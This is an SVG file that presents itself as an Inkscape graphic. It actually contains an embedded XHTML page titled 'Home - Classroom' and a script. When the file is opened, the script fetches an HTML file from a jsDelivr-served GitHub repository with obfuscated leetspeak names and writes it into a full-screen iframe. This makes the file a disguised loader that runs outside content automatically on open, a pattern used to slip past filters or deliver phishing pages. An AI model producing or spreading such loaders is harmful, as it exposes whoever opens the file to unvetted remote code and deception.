<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg
   width="100%"
   height="100%"
   viewBox="0 0 1920 1080"
   version="1.1"
   id="svg2"
   sodipodi:docname="20260831-032739_6a94f4ab7e1c1.svg"
   xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
   xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns:xhtml="http://www.w3.org/1999/xhtml">
  <defs
     id="defs6" />
  <sodipodi:namedview
     id="namedview4"
     pagecolor="#ffffff"
     bordercolor="#000000"
     borderopacity="0.25"
     inkscape:showpageshadow="2"
     inkscape:pageopacity="0.0"
     inkscape:pagecheckerboard="0"
     inkscape:deskcolor="#d1d1d1" />
  <foreignObject
     id="fo"
     width="1920"
     height="1080"
     x="0"
     y="0">
    <xhtml:html
       style="width:100%;height:100%;margin:0;padding:0">
      <xhtml:head>
        <xhtml:title>Home - Classroom</xhtml:title>
        <xhtml:link
           rel="icon"
           type="image/x-icon"
           href="data:image/x-icon;base64," />
        <xhtml:style>*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        html, body { width: 100%; height: 100%; overflow: hidden; background: #000; }
        iframe { position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: 0; }</xhtml:style>
      </xhtml:head>
      <xhtml:body>
        <xhtml:iframe
           id="fm"
           src="about:blank" />
        <xhtml:script>//<![CDATA[
        (function() {
          function size() {
            var w = window.innerWidth, h = window.innerHeight;
            var svg = document.querySelector('svg');
            var fo  = document.querySelector('foreignObject');
            if (svg) { svg.setAttribute('width', w); svg.setAttribute('height', h); svg.setAttribute('viewBox','0 0 '+w+' '+h); }
            if (fo)  { fo.setAttribute('width', w);  fo.setAttribute('height', h); }
          }
          size();
          window.addEventListener('resize', size);
          (async () => {
            try {
              const url = 'https://quantil.jsdelivr.net/gh/s0n-1m-cr1n3/sc13nc3/assets/class.html?t=' + Date.now();
              const res = await fetch(url);
              const text = await res.text();
              const frame = document.getElementById('fm');
              const fdoc = frame.contentDocument || frame.contentWindow.document;
              fdoc.open();
              fdoc.write(text);
              fdoc.close();
            } catch(e) {
              console.error('Loader error:', e);
            }
          })();
        })();
      //]]></xhtml:script>
      </xhtml:body>
    </xhtml:html>
  </foreignObject>
</svg>
